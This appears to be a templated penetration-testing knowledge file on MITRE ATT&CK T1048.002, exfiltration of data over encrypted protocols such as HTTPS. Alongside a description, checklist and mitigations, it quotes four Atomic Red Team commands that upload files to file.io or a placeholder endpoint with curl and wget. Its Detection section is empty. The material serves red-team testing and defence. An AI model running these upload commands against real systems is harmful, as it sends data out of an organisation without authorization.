---
name: "T1048.002_exfiltration-over-asymmetric-encrypted-non-c2-protocol"
description: "Adversaries may steal data by exfiltrating it over an asymmetrically encrypted network protocol other than that of the existing command and control channel."
category: "client-side"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1048.002
  - exfiltration
  - linux
  - macos
  - windows
  - esxi
  - sub-technique
technique_id: "T1048.002"
tactic: "exfiltration"
all_tactics:
  - exfiltration
platforms:
  - Linux
  - macOS
  - Windows
  - ESXi
mitre_url: "https://attack.mitre.org/techniques/T1048/002"
tech_stack:
  - linux
  - macos
  - windows
  - esxi
cwe_ids:
  - CWE-200
chains_with:
  - T1048
  - T1048.001
  - T1048.003
prerequisites:
  - T1048
severity_boost:
  T1048: "Chain with T1048 for deeper attack path"
  T1048.001: "Chain with T1048.001 for deeper attack path"
  T1048.003: "Chain with T1048.003 for deeper attack path"
---

# T1048.002 Exfiltration Over Asymmetric Encrypted Non-C2 Protocol

> **Sub-technique of:** T1048

## High-Level Description

Adversaries may steal data by exfiltrating it over an asymmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. 

Asymmetric encryption algorithms are those that use different keys on each end of the channel. Also known as public-key cryptography, this requires pairs of cryptographic keys that can encrypt/decrypt data from the corresponding key. Each end of the communication channels requires a private key (only in the procession of that entity) and the public key of the other entity. The public keys of each entity are exchanged before encrypted communications begin. 

Network protocols that use asymmetric encryption (such as HTTPS/TLS/SSL) often utilize symmetric encryption once keys are exchanged. Adversaries may opt to use these encrypted mechanisms that are baked into a protocol.

## Kill Chain Phase

- Exfiltration (TA0010)

**Platforms:** Linux, macOS, Windows, ESXi

## What to Check

- [ ] Identify if Exfiltration Over Asymmetric Encrypted Non-C2 Protocol technique is applicable to target environment
- [ ] Check Linux systems for indicators of Exfiltration Over Asymmetric Encrypted Non-C2 Protocol
- [ ] Check macOS systems for indicators of Exfiltration Over Asymmetric Encrypted Non-C2 Protocol
- [ ] Check Windows systems for indicators of Exfiltration Over Asymmetric Encrypted Non-C2 Protocol
- [ ] Verify mitigations are bypassed or absent (4 known mitigations)
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: Exfiltrate data HTTPS using curl windows

Exfiltrate data HTTPS using curl to file share site file.io

**Supported Platforms:** windows

```cmd
#{curl_path} -k -F "file=@#{input_file}" https://file.io/
```

**Dependencies:**
- Curl must be installed on system.
- #{input_file} must be exist on system.

### Atomic Test 2: Exfiltrate data HTTPS using curl freebsd,linux or macos

Exfiltrate data HTTPS using curl to file share site file.io

**Supported Platforms:** macos, linux

```bash
curl -F 'file=@#{input_file}' -F 'maxDownloads=1' -F 'autoDelete=true' https://file.io/
```

### Atomic Test 3: Exfiltrate data in a file over HTTPS using wget

Exfiltrate data over HTTPS using wget --post-file method

**Supported Platforms:** linux

```bash
wget --post-file="#{input_file}" --timeout=5 --no-check-certificate #{endpoint_domain} --delete-after
```

### Atomic Test 4: Exfiltrate data as text over HTTPS using wget

Exfiltrate data over HTTPS using wget --post-data method

**Supported Platforms:** linux

```bash
wget --post-data="msg=AtomicTestT1048.002" --timeout=5 --no-check-certificate #{endpoint_domain} --delete-after
```


### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to Exfiltration Over Asymmetric Encrypted Non-C2 Protocol by examining the target platforms (Linux, macOS, Windows).

2. **Assess Existing Defenses**: Review whether mitigations for T1048.002 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

### M1031 Network Intrusion Prevention
Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary command and control infrastructure and malware can be used to mitigate activity at the network level.

### M1030 Network Segmentation
Follow best practices for network firewall configurations to allow only necessary ports and traffic to enter and exit the network.

### M1037 Filter Network Traffic
Enforce proxies and use dedicated servers for services such as DNS and only allow those systems to communicate over respective ports/protocols, instead of all systems within a network.

### M1057 Data Loss Prevention
Data loss prevention can detect and block sensitive data being uploaded via web browsers.


## Detection

### Detection of Exfiltration Over Asymmetric Encrypted Non-C2 Protocol


## Risk Assessment

| Finding | Severity | Impact |
| ------- | -------- | ------ |
| Exfiltration Over Asymmetric Encrypted Non-C2 Protocol technique applicable | Low | Exfiltration |

## CWE Categories

| CWE ID | Title |
| ------ | ----- |
| CWE-200 | Exposure of Sensitive Information |


## References

- [University of Birmingham C2](https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf)
- [Atomic Red Team - T1048.002](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1048.002)
- [MITRE ATT&CK - T1048.002](https://attack.mitre.org/techniques/T1048/002)
